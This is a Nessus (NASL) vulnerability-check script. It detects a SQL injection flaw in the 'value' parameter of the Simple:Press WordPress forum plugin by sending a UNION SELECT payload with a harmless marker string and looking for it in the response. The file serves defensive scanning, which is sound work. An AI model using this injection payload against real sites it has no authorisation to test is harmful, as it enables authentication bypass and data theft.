#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(47681);
  script_version("$Revision: 1.10 $");
  script_cvs_date("$Date: 2015/09/24 23:21:23 $");

  script_bugtraq_id(41348);
  script_osvdb_id(65980);
  script_xref(name:"EDB-ID", value:"14198");
  script_xref(name:"Secunia", value:"40446");

  script_name(english:"Simple:Press Plugin for WordPress 'value' parameter SQL Injection");
  script_summary(english:"Attempts to inject SQL code via the 'value' parameter.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a web application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the Simple:Press plugin for WordPress installed on the
remote host fails to properly sanitize user-supplied input to the
'value' parameter of the 'sf-header-forum.php' script.

An unauthenticated, remote attacker can leverage this issue to launch
a SQL injection attack against the affected application, leading to an
authentication bypass, the disclosure of sensitive information, and
attacks against the underlying database.");
  script_set_attribute(attribute:"solution", value:"There is no known solution at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/07/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/07/08");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# This function converts a string to a concatenation of hex chars so we
# can pass in strings without worrying about PHP's magic_quotes_gpc
function hexify(str)
{
  local_var hstr, i, l;
  l = strlen(str);
  if (l == 0) return "";

  hstr = "concat(";
  for (i=0; i<l; i++)
    hstr += hex(ord(str[i])) + ",";
  hstr[strlen(hstr)-1] = ")";

  return hstr;
}

# Determine the URL for the forum using the ?xfeed=all parameter
flag = 0;
forum_page = NULL;
forum_port = port;
res = http_send_recv3(method:"GET", item:dir+'/?xfeed=all', port:port, exit_on_fail:TRUE);
plugin = 'Simple:Press';

lines = split(sep:'\n', res[2]);
foreach line (lines)
{
  # If the generator is from simple press
  if (line =~ '<link>https?://')
  {
    line = strstr(line, '<link>');
    # If there is a port in the link, make sure it is the same as the port we're looking at.
    if (line =~ '<link>https?://.*:[0-9]+')
    {
      forum_port = ereg_replace(pattern:'<link>https?://.*:([0-9]+)', replace:"\1", string:line);
    }
    if (forum_port == port)
    {
      pat = '<link>https?://.*'+dir+'([^:<]+).*';
      forum_page = ereg_replace(pattern:pat, replace:"\1", string:line);
    }
  }
  if (forum_page && line =~ '<generator>Simple:Press Version')
  {
    break;
  }
  # Reset the forum_page each time we get a new channel, as that's the separator between RSS feeds
  if (line =~ '</channel>')
  {
    forum_page = NULL;
  }
}
if (empty_or_null(forum_page))
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");
else
  replace_kb_item(name:'www/'+port+'/webapp_ext/'+plugin+' under '+dir, value:TRUE);

# Attempt to exploit the vulnerability.
payload = hexify(str:SCRIPT_NAME+'-'+unixtime());
exploit = '9999+UNION+SELECT+\''+payload+'\'+--';

url = dir + forum_page;
if ('?' >< url) url += '&';
url += 'forum=all&value='+exploit+'&type=9&search=1&searchpage=2';

res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);
if (
  'div id="search-results" class="sfblock"' >< res[2] &&
  '<div class="sfmessagestrip"' >< res[2] &&
  '<td><p>Search All Forums<br />Topics started by '+payload >< res[2]
)
{
  set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);
  if (report_verbosity > 0)
  {
    report =
      '\n' +
      'Nessus was able to verify the issue with the following URL :\n' +
      '\n' +
      build_url(port:port, qs:url);
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
